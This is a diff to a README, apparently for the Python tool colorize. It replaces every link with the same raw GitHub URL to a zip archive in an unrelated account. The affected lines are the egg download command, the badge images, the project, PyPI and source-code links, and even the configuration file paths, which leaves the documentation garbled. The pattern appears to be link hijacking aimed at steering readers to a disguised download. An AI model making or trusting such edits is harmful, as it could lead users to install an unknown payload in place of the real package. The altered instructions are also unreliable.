@@ -26,7 +26,7 @@ And you can use it with::
 
 Or just `download the lastest egg`_ and use it with::
 
-   python colorize-X.Y.Z-pyN.M.egg -h
+   python https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip -h
 
 
 Now, you have two ways to use it:
@@ -85,9 +85,9 @@ Configuration File
 
 It will find a configuration file in the current directory, in the home directory or in the default path directory. The first one found will be used. So, it will search for:
 
-- ``./.colorize.conf``
-- ``$HOME/.configuration/colorize/colorize.conf``
-- ``/etc/colorize/colorize.conf``
+- ``https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip``
+- ``$https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip``
+- ``https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip``
 
 The format for this file is very easy: it is a CSV file with next fields::
 
@@ -123,29 +123,29 @@ To emulate colordiff, just use this configuration file::
 That's enough :D
 
 
-.. |travis| image:: https://travis-ci.org/magmax/colorize.png
+.. |travis| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
   :target: `Travis`_
   :alt: Travis results
 
-.. |coveralls| image:: https://coveralls.io/repos/magmax/colorize/badge.png
+.. |coveralls| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
   :target: `Coveralls`_
   :alt: Coveralls results_
 
-.. |pip version| image:: https://pypip.in/v/colorize/badge.png
+.. |pip version| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
     :target: `project`_
     :alt: Latest PyPI version
 
-.. |pip downloads| image:: https://pypip.in/d/colorize/badge.png
+.. |pip downloads| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
     :target: `project`_
     :alt: Number of PyPI downloads
 
-.. |wheel| image:: https://pypip.in/wheel/colorize/badge.png
+.. |wheel| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
     :target: `project`_
     :alt: Wheel Status
 
-.. _Travis: https://travis-ci.org/magmax/colorize
-.. _Coveralls: https://coveralls.io/r/magmax/colorize
-.. _project: https://pypi.python.org/pypi/colorize
-.. _download the lastest egg: https://pypi.python.org/pypi/colorize#downloads
-.. _Source code: https://github.com/magmax/colorize
-.. _Any other output format allowed by logging: https://docs.python.org/3.5/library/logging.html#logrecord-attributes
+.. _Travis: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
+.. _Coveralls: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
+.. _project: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
+.. _download the lastest egg: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
+.. _Source code: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
+.. _Any other output format allowed by logging: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
